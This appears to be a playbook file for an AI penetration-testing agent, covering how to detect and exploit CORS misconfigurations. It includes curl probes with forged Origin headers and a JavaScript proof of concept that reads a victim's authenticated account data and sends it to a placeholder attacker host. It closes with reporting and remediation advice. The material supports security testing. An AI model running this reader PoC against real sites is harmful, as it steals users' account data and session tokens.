---
name: cors
description: >-
  CORS misconfiguration playbook — probe endpoints serving sensitive data for Access-Control-Allow-Origin reflecting arbitrary origins (especially with Access-Control-Allow-Credentials: true), then build a cross-origin reader PoC that steals the victim's data/state. Use when an API returns account data, tokens, or personal info and might set permissive CORS headers.
allowed-tools:
  - http
  - shell
  - file_write
---

# CORS misconfiguration playbook

Goal: prove that an attacker origin can read a victim's authenticated responses. An ACAO header alone is fine when no credentials are allowed — only pairing `Access-Control-Allow-Origin: <attacker>` with `Access-Control-Allow-Credentials: true` is exploitable.

## 1. Find CORS-relevant endpoints

Probe the API endpoints that return account/sensitive data with a fake Origin:

```sh
curl -ksS "https://TARGET/api/me" -H "Origin: https://evil.example" -I
curl -ksS "https://TARGET/api/me" -H "Origin: https://evil.example" -D- -o /dev/null
```

Look at response headers:
- `access-control-allow-origin: https://evil.example` (reflected!)
- `access-control-allow-credentials: true`

Also try `Origin: null` (sandboxed iframes / data: URIs), `Origin: https://evilexample.evil.example`, `Origin: https://TARGET.evil.example`, and subdomain origins if the app owns wildcard subdomains:

```sh
for o in "https://evil.example" "null" "https://assets.TARGET" "https://TARGET.attacker.com"; do
  curl -ksS "https://TARGET/api/me" -H "Origin: $o" -D- -o /dev/null | grep -i "access-control"
done
```

## 2. Check the credentials flag

Reflection is meaningless without credentials:

```sh
curl -ksS "https://TARGET/api/me" -H "Origin: https://evil.example" -D- -o /dev/null \
  | grep -iE "access-control-allow-(origin|credentials)"
```

If `allow-origin` reflects AND `allow-credentials: true` → exploitable. If `allow-credentials: false` or absent → not exploitable on its own (note it as low severity, still useful chained with XSS/CSRF).

## 3. Build the reader PoC

```html
<!-- attacker page — victim's browser runs this JS -->
<script>
fetch('https://TARGET/api/me', { credentials: 'include' })
  .then(r => r.text())
  .then(data => new Image().src = '//ATTACKER/exfil?d=' + encodeURIComponent(data));
</script>
```

Verify with curl using a cookie from your own session that the reflected-origin response actually carries the sensitive body (same request, with `Cookie: session=...`).

## 4. Extend the blast radius

- Which endpoints reflect: /api/me, /api/orders, admin endpoints, token refresh, password-change forms (POST with credentials → cross-origin state change + read).
- Does the app allow `Origin: null` from sandboxed iframes? That widens attacker reach (any sandboxed env).
- Combine with a redirect/open-redirect on the same origin to reflect an attacker-controlled Origin value if validation checks hostname only.

## 5. Reporting

Evidence: the exact request with the Origin header and the response CORS headers + sensitive body. Impact: read victim's account data, tokens, or perform credentialed state changes cross-origin. Remediation: allowlist exact origins (no reflection, no null), never combine reflection with Allow-Credentials, use SameSite cookies.

When the reflected-origin response carries authenticated data, call `confirm_finding`.